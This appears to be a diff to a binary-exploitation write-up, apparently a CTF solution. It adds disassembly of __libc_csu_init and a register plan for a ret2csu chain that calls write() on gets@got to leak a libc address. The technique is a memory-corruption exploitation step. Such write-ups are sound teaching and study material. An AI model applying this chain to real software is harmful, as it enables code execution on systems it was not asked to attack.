@@ -76,6 +76,7 @@ The portion which is of interest to us is this:
 Section1:
 
 ```
+   0x00000000004011c6 <+86>:    add    rsp,0x8
    0x00000000004011ca <+90>:    pop    rbx
    0x00000000004011cb <+91>:    pop    rbp
    0x00000000004011cc <+92>:    pop    r12
@@ -92,9 +93,28 @@ Section2:
    0x00000000004011b3 <+67>:    mov    rsi,r13
    0x00000000004011b6 <+70>:    mov    edi,r12d
    0x00000000004011b9 <+73>:    call   QWORD PTR [r15+rbx*8]
+   0x00000000004011bd <+77>:    add    rbx,0x1
+   0x00000000004011c1 <+81>:    cmp    rbp,rbx
+   0x00000000004011c4 <+84>:    jne    0x4011b0 <__libc_csu_init+64>
+```
+
+With this we can control the rdx register! You may ask why well let's see
+
+First I need to make use of the csu pop gadgets because eventually when i call the csu gadget to control the rdi, rsi & rdx registers it would use the registers which we can control with the csu pop gadget
+
+Idea is this:
+
+```
+r12 == 0x1 (fd)
+r13 == gets@got (got for gets())
+r14 == 0x8 (size for stdout)
+r15 == write@got (got for write() because it does a call at __libc_csu_init+73)
+rbx == 0x0 (due to instruction at __libc_csu_init+73: [Base index*scale + displacement] we need to make rbx 0 so when it does rbx*8 that should be equal to 0 then r15 + 0 == r15
+junk == b'A'*8 (for instruction at __libc_csu_init+86, since it's adds extra 8 bytes to the stack we need to pad it with additional 8 bytes
 ```
 
 
+rbp == 0x1 (to pass the comparism at __libc_csu_init+81
 
 
 
